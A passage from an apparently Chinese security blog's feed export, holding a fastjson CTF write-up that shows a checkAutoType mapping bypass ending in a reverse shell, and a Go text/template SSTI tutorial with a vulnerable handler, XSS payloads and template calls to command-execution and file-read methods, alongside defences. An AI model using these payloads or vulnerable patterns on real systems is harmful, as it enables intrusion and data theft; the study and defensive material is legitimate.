&#123;</span><br><span class="line">    clazz = deserializers.findClass(typeName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">    clazz = typeMapping.get(typeName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>经过测试，最主要的方法是<code>TypeUtils.getClassFromMapping</code>这个方法会去TypeUtils的mappings成员里找是否有以typeName为Name的类（🌟🌟这个很重要 记一下）mappings是静态私有成员，在初始化时就放入了107个常见类（也是SecureObjectInputStream认为是安全的类）</p></blockquote><p>调的过程中发现三次执行的过程中，这个mappings成员的size分别是108、109、110，而在110时反序列化成功，想必大家看到这里都能发现这个关键点了，也能猜测到前两次工作是把抛出异常没找到那个类添加进mappings</p><h2 id="0x03-调试分析"><a href="#0x03-调试分析" class="headerlink" title="0x03 调试分析"></a>0x03 调试分析</h2><p>理论上是说得通了，还得是调试一下来验证</p><h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><p>这题里能传入checkAutoType去寻找的非原生类只有</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">com.ctf.ezser.bean.MyBean <span class="comment">//反序列化终点，被调用getConnect-》this.conn.connect();</span></span><br><span class="line">javax.management.remote.rmi.RMIConnector <span class="comment">//传入MyBean构造函数给conn赋值</span></span><br><span class="line">javax.management.remote.JMXServiceURL  <span class="comment">//用于传入RMIConnector构造函数</span></span><br></pre></td></tr></table></figure></div><h3 id="异常信号寻找"><a href="#异常信号寻找" class="headerlink" title="异常信号寻找"></a>异常信号寻找</h3><p>首先先找一下这个一直报错的<code>default constructor not found. class xxx</code>字段，找出来是在<code>JavaBeanInfo#build</code>方法的某处</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> ((!kotlin)</span><br><span class="line">            &amp;&amp; !clazz.getName().equals(<span class="string">&quot;javax.servlet.http.Cookie&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">JavaBeanInfo</span>(clazz, builderClass, <span class="literal">null</span>, creatorConstructor, <span class="literal">null</span>, <span class="literal">null</span>, jsonType, fieldList);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;default constructor not found. &quot;</span> + clazz);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>在这题的反序列化过程中kotlin都为false，因此关注第二个条件，经调试，走到这一步的clazz都不会是<code>javax.servlet.http.Cookie</code>，而是上面三个前提条件中的后两个</p></blockquote><p>checkAutoType方法后续会创建一个JavaBeanInfo调用clazz方法，不过前提是前一个if没有成功的return跳出函数，从下面代码可以看出，如果三种方法都找不到class，也就不会提前退出</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">    clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">    clazz = deserializers.findClass(typeName);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">    clazz = typeMapping.get(typeName);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (expectClass != <span class="literal">null</span></span><br><span class="line">            &amp;&amp; clazz != java.util.HashMap.class</span><br><span class="line">            &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//...🌟🌟</span></span><br><span class="line">  <span class="keyword">if</span> (clazz == <span class="literal">null</span> &amp;&amp; (autoTypeSupport || jsonType || expectClassFlag)) &#123;</span><br><span class="line">      <span class="type">boolean</span> <span class="variable">cacheClass</span> <span class="operator">=</span> autoTypeSupport || jsonType;</span><br><span class="line">      clazz = TypeUtils.loadClass(typeName, defaultClassLoader, cacheClass);</span><br><span class="line">  &#125;<span class="comment">//***处</span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="type">JavaBeanInfo</span> <span class="variable">beanInfo</span> <span class="operator">=</span> JavaBeanInfo.build(clazz, clazz, propertyNamingStrategy);</span><br><span class="line">    <span class="keyword">if</span> (beanInfo.creatorConstructor != <span class="literal">null</span> &amp;&amp; autoTypeSupport) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure></div><blockquote><p>若没有提前退出会来到上面标识的<code>***</code>处，这里有一个很重要的操作，把还没找到的类的类名typeName添加进TypeUtils的mappings中，使用类加载器加载该类并赋值给clazz，这里可以简单看一下TypeUtils.loadClass关键部分</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(classLoader != <span class="literal">null</span>)&#123;</span><br><span class="line"> clazz = classLoader.loadClass(className);</span><br><span class="line"> <span class="keyword">if</span> (cache) &#123;</span><br><span class="line">     mappings.put(className, clazz);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></blockquote><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>总结一下传入<code>ParserConifg#checkAutoType</code>的类名会经历以下过程</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>简单的类名检查，若处于黑名单则抛出异常 autoType is not support xxx</span><br><span class="line"><span class="number">2.</span>使用三种方法通过类名来加载类：</span><br><span class="line">        TypeUtils.getClassFormMappings (基本都通过这个方法找到)</span><br><span class="line">        IdentityHashMap.findClass</span><br><span class="line">        ConcurrentHashMap.get</span><br><span class="line"><span class="number">3.</span>若找到，会进入以下<span class="keyword">if</span>进而<span class="keyword">return</span>找到的类提前退出checkAutoType函数</span><br><span class="line"><span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (expectClass != <span class="literal">null</span></span><br><span class="line">            &amp;&amp; clazz != java.util.HashMap.class</span><br><span class="line">            &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">4.</span>继续执行，通过TypeUtils的loadClass方法利用类加载器找到类，并将当前类加入TypeUtils的mappings中</span><br><span class="line"><span class="number">5.</span>调用JavaBeanInfo的build方法，传入当前类，当类没有无参构造函数时会抛出异常 <span class="keyword">default</span> constructor not found. xxxx</span><br></pre></td></tr></table></figure></div><h3 id="第一次反序列化"><a href="#第一次反序列化" class="headerlink" title="第一次反序列化"></a>第一次反序列化</h3><p>首先是入口点</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objectInputStream.readObject();</span><br></pre></td></tr></table></figure></div><p>接着来到JSONArray#readObject</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(<span class="keyword">final</span> java.io.ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">      JSONObject.SecureObjectInputStream.ensureFields();</span><br><span class="line">      <span class="keyword">if</span> (JSONObject.SecureObjectInputStream.fields != <span class="literal">null</span> &amp;&amp; !JSONObject.SecureObjectInputStream.fields_error) &#123;</span><br><span class="line">          <span class="type">ObjectInputStream</span> <span class="variable">secIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>.SecureObjectInputStream(in);</span><br><span class="line">          <span class="keyword">try</span> &#123;</span><br><span class="line">              secIn.defaultReadObject();</span><br><span class="line">              <span class="keyword">return</span>;</span><br><span class="line">          &#125; <span class="keyword">catch</span> (java.io.NotActiveException e) &#123;</span><br><span class="line">              <span class="comment">// skip</span></span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  <span class="comment">//。。。</span></span><br></pre></td></tr></table></figure></div><p>之后就被<code>SecureObjectInputStream</code>劫持了</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305050237433.png"                      alt="image-20230505020221637"                ><figcaption>image-20230505020221637</figcaption></figure></p><p>直接来到最关键的checkAutoType方法，可以看到先找的是MyBean</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305050237274.png"                      alt="image-20230505020313917"                ><figcaption>image-20230505020313917</figcaption></figure></p><p>跟进checkAutoType方法，前面部分跳过，直接来个经典三个方法寻找类</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305050237845.png"                      alt="image-20230505020425672"                ><figcaption>image-20230505020425672</figcaption></figure></p><p>这里可以先跟进一下getClassFromMapping方法，可以看到此时的Mappings（size：107）</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305050237915.png"                      alt="image-20230505020521779"                ><figcaption>image-20230505020521779</figcaption></figure></p><p>经过三个方法，仍然没有找到类，这也就意味着接下来一定会去到JavaBeanInfo的build方法中(异常抛出点)，不过在这之前会先通过Typeutils的loadClass方法找到类，并添加mappings的数量</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (clazz == <span class="literal">null</span> &amp;&amp; (autoTypeSupport || jsonType || expectClassFlag)) &#123;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">cacheClass</span> <span class="operator">=</span> autoTypeSupport || jsonType;</span><br><span class="line">    clazz = TypeUtils.loadClass(typeName, defaultClassLoader, cacheClass);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>MyBean被添加，size变为108</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305050238540.png"                      alt="image-20230505020903956"                ><figcaption>image-20230505020903956</figcaption></figure></p><p>之后就来到了这个死亡异常抛出点JavaBeanInfo的build方法，但你会惊奇的发现，并没有抛出异常，程序继续走到了下一个类RMIConnector传入checkAutoType方法，其实是因为这个if的条件不满足，build函数提前返回</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305050238797.png"                      alt="image-20230505021125948"                ><figcaption>image-20230505021125948</figcaption></figure></p><blockquote><p>这也很好理解，那个异常提示的很明显了<code>default constructor not found. class xxx</code>而MyBean明显是有无参构造方法的，这里的defaultConstructor就是获取到了无参构造方法</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305050238509.png"                      alt="image-20230505015849391"                ><figcaption>image-20230505015849391</figcaption></figure></p></blockquote><p>没有异常抛出，无事发生，接着轮到RMIConnector</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305050247946.png"                      alt="image-20230505021320328"                ><figcaption>image-20230505021320328</figcaption></figure></p><p>后面都是一样的操作，三个方法都找不到类，被添加进mappings，size+1</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305050238031.png"                      alt="image-20230505021419699"                ><figcaption>image-20230505021419699</figcaption></figure></p><p>然后来到死亡异常抛出点JavaBeanInfo的build方法，没有无参构造函数</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305050238335.png"                      alt="image-20230505021538934"                ><figcaption>image-20230505021538934</figcaption></figure></p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305050239359.png"                      alt="image-20230505021549225"                ><figcaption>image-20230505021549225</figcaption></figure></p><p>迎来第一次报错</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305050239280.png"                      alt="image-20230505021625294"                ><figcaption>image-20230505021625294</figcaption></figure></p><h3 id="第二次反序列化"><a href="#第二次反序列化" class="headerlink" title="第二次反序列化"></a>第二次反序列化</h3><p>接着进行第二次，发送payload</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305050239992.png"                      alt="image-20230505021702771"                ><figcaption>image-20230505021702771</figcaption></figure></p><p>MyBean和RMIConnector的checkAutoType就先跳过，这两类以及被加入mappings了，是可以通过三个方法后的这部分代码提前退出的,就不再跟进</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (expectClass != <span class="literal">null</span></span><br><span class="line">            &amp;&amp; clazz != java.util.HashMap.class</span><br><span class="line">            &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>直接开始分析JMXServiceURL，三个方法找不到类，调用laodClass</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305050239172.png"                      alt="image-20230505021939903"                ><figcaption>image-20230505021939903</figcaption></figure></p><p>加入mappings， size+1，至此，可以支持反序列化成功的mappigns已经装填好</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305050239392.png"                      alt="image-20230505022008745"                ><figcaption>image-20230505022008745</figcaption></figure></p><p>之后又因为没有无参构造方法抛出异常</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305050239543.png"                      alt="image-20230505022107758"                ><figcaption>image-20230505022107758</figcaption></figure></p><p>迎来第二个报错</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305050239596.png"                      alt="image-20230505022142322"                ><figcaption>image-20230505022142322</figcaption></figure></p><h3 id="第三次反序列化（也是反序列化成功的开始）"><a href="#第三次反序列化（也是反序列化成功的开始）" class="headerlink" title="第三次反序列化（也是反序列化成功的开始）"></a>第三次反序列化（也是反序列化成功的开始）</h3><p>先提前架起ldap服务和vps监听</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305050239279.png"                      alt="image-20230505022409515"                ><figcaption>image-20230505022409515</figcaption></figure></p><p>发送payload</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305050240664.png"                      alt="image-20230505022432324"                ><figcaption>image-20230505022432324</figcaption></figure></p><p>通过了前面三个类的checkAutoType方法，来到BadAttributeValueExpException的readObject方法</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305050240513.png"                      alt="image-20230505022631154"                ><figcaption>image-20230505022631154</figcaption></figure></p><p>接着触发getter</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305050240832.png"                      alt="image-20230505022649684"                ><figcaption>image-20230505022649684</figcaption></figure></p><p>成功反弹shell</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305050240730.png"                      alt="image-20230505022721373"                ><figcaption>image-20230505022721373</figcaption></figure></p>]]></content>
      
      
      <categories>
          
          <category> JavaSec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fastjson </tag>
            
            <tag> java </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GO SSTI</title>
      <link href="/2023/03/13/GO-SSTI/"/>
      <url>/2023/03/13/GO-SSTI/</url>
      
        <content type="html"><![CDATA[<h1 id="GO-SSTI"><a href="#GO-SSTI" class="headerlink" title="GO SSTI"></a>GO SSTI</h1><h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><h3 id="识别方法"><a href="#识别方法" class="headerlink" title="识别方法"></a>识别方法</h3><p>代码中引入了<code>text/template</code>，会导致SSTI漏洞出现</p><p>运算符号在<code>&#123;&#123;&#125;&#125;</code>中是非法的，需要使用其他payload，比如占位符号<code>&#123;&#123;.&#125;&#125;</code>,如果存在ssti，那么就无回显</p><h3 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h3><div class="highlight-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;strings&quot;</span></span><br><span class="line"><span class="string">&quot;text/template&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> &#123;</span><br><span class="line">Id     <span class="type">int</span></span><br><span class="line">Name   <span class="type">string</span></span><br><span class="line">Passwd <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">StringTplExam</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">user := &amp;User&#123;<span class="number">1</span>, <span class="string">&quot;tyskill&quot;</span>, <span class="string">&quot;tyskill&quot;</span>&#125;</span><br><span class="line">r.ParseForm()</span><br><span class="line">arg := strings.Join(r.PostForm[<span class="string">&quot;name&quot;</span>], <span class="string">&quot;&quot;</span>)</span><br><span class="line">tpl1 := fmt.Sprintf(<span class="string">`&lt;h1&gt;Hi, `</span> + arg + <span class="string">`&lt;/h1&gt; Your name is &#123;&#123; .Name &#125;&#125;`</span>)</span><br><span class="line">html, err := template.New(<span class="string">&quot;login&quot;</span>).Parse(tpl1)</span><br><span class="line">html = template.Must(html, err)</span><br><span class="line">html.Execute(w, user)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">server := http.Server&#123;</span><br><span class="line">Addr: <span class="string">&quot;127.0.0.1:8080&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line">http.HandleFunc(<span class="string">&quot;/string&quot;</span>, StringTplExam)</span><br><span class="line">server.ListenAndServe()</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>go通过结构体来类比一个对象，一个子段就是一个对象的属性，模版渲染也支持传入一个结构体的实例来渲染字段，上面代码中，name部分可控，可以仿造<code>&#123;&#123; .Name&#125;&#125;</code>，构造<code>&#123;&#123;.Passw&#125;&#125;</code>，得到Passwd字段</p><p><code>user := &amp;User&#123;1, &quot;tyskill&quot;, &quot;tyskill&quot;&#125;</code>使用了模版<code>&amp;User</code>因此<code>&#123;&#123;.Passwd&#125;&#125;</code>可以得到它的属性</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032243822.png"                      alt="image-20230413215152150"                ><figcaption>image-20230413215152150</figcaption></figure></p><p>直接用.可以得到模版的全部内容</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032244524.png"                      alt="image-20230413215255743"                ><figcaption>image-20230413215255743</figcaption></figure></p><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><p>拒绝拼接，直接传入.字段名</p><div class="highlight-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">StringTpl2Exam</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">user := &amp;User&#123;<span class="number">1</span>, <span class="string">&quot;tyskill&quot;</span>, <span class="string">&quot;tyskill&quot;</span>&#125;</span><br><span class="line">r.ParseForm()</span><br><span class="line">arg := strings.Join(r.PostForm[<span class="string">&quot;name&quot;</span>], <span class="string">&quot;&quot;</span>)</span><br><span class="line">tpl := <span class="string">`&lt;h1&gt;Hi, &#123;&#123; .arg &#125;&#125;&lt;/h1&gt;&lt;br&gt;Your name is &#123;&#123; .Name &#125;&#125;`</span></span><br><span class="line">data := <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span>&#123;</span><br><span class="line"><span class="string">&quot;arg&quot;</span>:  arg,</span><br><span class="line"><span class="string">&quot;Name&quot;</span>: user.Name,</span><br><span class="line">&#125;</span><br><span class="line">html := template.Must(template.New(<span class="string">&quot;login&quot;</span>).Parse(tpl))</span><br><span class="line">html.Execute(w, data)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>go模版会打印字符串，如果是xss代码的话，也会直接执行，这个xss是拒绝拼接也无法防御的</p><div class="highlight-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&lt;script&gt;alert(/xss/)&lt;/script&gt;&quot;</span>&#125;&#125;</span><br><span class="line">&#123;&#123;<span class="built_in">print</span> <span class="string">&quot;&lt;script&gt;alert(/xss/)&lt;/script&gt;&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure></div><p>编码行为</p><div class="highlight-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;define <span class="string">&quot;T1&quot;</span>&#125;&#125;ONE&#123;&#123;end&#125;&#125;&#123;&#123;template <span class="string">&quot;T1&quot;</span>&#125;&#125;</span><br><span class="line">即&#123;&#123;define <span class="string">&quot;T1&quot;</span>&#125;&#125;&lt;script&gt;alert(<span class="number">1</span>)&lt;/script&gt;&#123;&#123;end&#125;&#125; &#123;&#123;template <span class="string">&quot;T1&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure></div><ul><li><code>&#123;template &quot;name&quot;&#125;&#125;</code> 执行名为name的模板，提供给模板的参数为nil，如模板不存在输出为””</li><li><code>&#123;&#123;define "name"&#125;`模板内容`&#123;&#123;end&#125;&#125;&#125;</code>定义一个名为name的模板</li></ul><p>这里实际上就是一个我们进行模板的定义，并输出的过程，这样我们就可以顺利的实现XSS了</p><h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><p>1.内置函数html转义特殊字符</p><div class="highlight-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;html <span class="string">&quot;&lt;script&gt;alert(/xss/)&lt;/script&gt;&quot;</span>&#125;&#125;</span><br><span class="line">&#123;&#123;js <span class="string">&quot;js代码&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure></div><p>2.<code>text/template</code>在模版处理阶段还定义<code>template.HTMLEscapeString</code>等转义函数</p><p>3.<code>html/template</code>模版包自带转义效果</p><h2 id="命令执行-amp-任意文件读取"><a href="#命令执行-amp-任意文件读取" class="headerlink" title="命令执行&amp;任意文件读取"></a>命令执行&amp;任意文件读取</h2><p>可以像<code>&#123;&#123; .Name&#125;&#125;</code>一样调用对象方法，模板内部并不存在可以RCE的函数，所以除非有人为渲染对象定义了RCE或文件读取的方法，不然这个问题是不存在的。</p><div class="highlight-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(u *User)</span></span> System(cmd <span class="type">string</span>, arg ...<span class="type">string</span>) <span class="type">string</span> &#123;</span><br><span class="line">out, _ := exec.Command(cmd, arg...).CombinedOutput()</span><br><span class="line"><span class="keyword">return</span> <span class="type">string</span>(out)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(u *User)</span></span> FileRead(File <span class="type">string</span>) <span class="type">string</span> &#123;</span><br><span class="line">data, err := ioutil.ReadFile(File)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Print(<span class="string">&quot;File read error&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="type">string</span>(data)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>如果定义了就可以通过<code>&#123;&#123;.System "whoami"&#125;&#125;</code>和<code>&#123;&#123;.FileRead "filepath"&#125;&#125;</code>执行</p><blockquote><p>正常程序猿都不会定义这么危险的函数</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
            <tag> ssti </tag>
            
        </tags>
      
    </entry>
